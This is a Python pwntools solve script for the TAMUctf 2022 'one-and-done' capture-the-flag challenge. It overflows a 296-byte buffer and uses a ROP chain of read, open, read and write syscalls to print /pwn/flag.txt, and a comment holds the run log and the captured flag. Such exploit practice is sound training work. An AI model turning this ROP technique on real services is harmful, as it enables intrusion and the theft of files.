from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './one-and-done'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
else:
  s = process(BINARY)

s.recvuntil("pwn me pls\n")
  
pop_rax_ret = 0x40100b # pop rax; ret;
pop_rdi_ret = 0x401793 # pop rdi; ret;
pop_rsi_ret = 0x401713 # pop rsi; ret;
pop_rdx_ret = 0x401f31 # pop rdx; ret;
syscall_ret = 0x401ab2 # syscall; ret;
bss_addr    = 0x404100

buf  = b"A"*296
buf += p64(pop_rax_ret)
buf += p64(0)
buf += p64(pop_rdi_ret)
buf += p64(0)
buf += p64(pop_rsi_ret)
buf += p64(bss_addr)
buf += p64(pop_rdx_ret)
buf += p64(0x10)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(2)
buf += p64(pop_rdi_ret)
buf += p64(bss_addr)
buf += p64(pop_rsi_ret)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(0)
buf += p64(pop_rdi_ret)
buf += p64(3)
buf += p64(pop_rsi_ret)
buf += p64(bss_addr)
buf += p64(pop_rdx_ret)
buf += p64(0x40)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(1)
buf += p64(pop_rdi_ret)
buf += p64(2)
buf += p64(syscall_ret)
buf += p64(elf.sym.main)
s.sendline(buf)

sleep(0.2)
s.sendline("/pwn/flag.txt\x00")

'''
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_One_and_Done$ python3 solve.py r
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_One_and_Done/one-and-done'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to tamuctf.com on port 443: Done
solve.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("pwn me pls\n")
solve.py:58: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline("/pwn/flag.txt\x00")
[*] Switching to interactive mode
gigem{trivial_but_its_static}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
'''


s.interactive()
